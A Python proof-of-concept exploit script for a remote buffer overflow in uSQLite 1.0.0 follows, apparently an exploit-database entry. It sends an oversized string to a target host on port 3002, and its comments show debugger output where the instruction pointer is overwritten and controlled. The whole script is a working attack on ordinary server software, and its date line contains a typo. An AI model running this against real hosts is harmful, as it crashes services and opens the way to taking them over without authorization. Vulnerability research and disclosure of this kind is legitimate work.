#!/usr/bin/python
# Exploit Title: Remote buffer overflow vulnerability in uSQLite 1.0.0 PoC
# Date: 27/10/1016
# Exploit Author: Peter Baris
# Software Link: https://sourceforge.net/projects/usqlite/?source=directory
# Version: 1.0.0
# Tested on: windows 7 and XP SP3

# Longer strings will cause heap based overflow

# usage:  python usqlite.py <host address>

# Output in the debugger

# EAX 0000038C
# ECX 00B0DA10
# EDX 0000038C
# EBX 41414141
# ESP 0028F8D0 ASCII "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC
# EBP 41414141
# ESI 41414141
# EDI 41414141

# EIP 42424242  <-- EIP is under control, but depending on the OS version, you might have issues finding a jump spot without DEP and ASLR.

###############################################################################################################################################

import socket
import sys


if len(sys.argv)<=1:
	print("Usage: python usqlite.py hostname")
	sys.exit()


hostname=sys.argv[1]
port = 3002
buffer = "A"*259+"B"*4+"C"*360

sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=sock.connect((hostname,port))
sock.send(buffer +'\r\n')
sock.recv(1024)
sock.close()
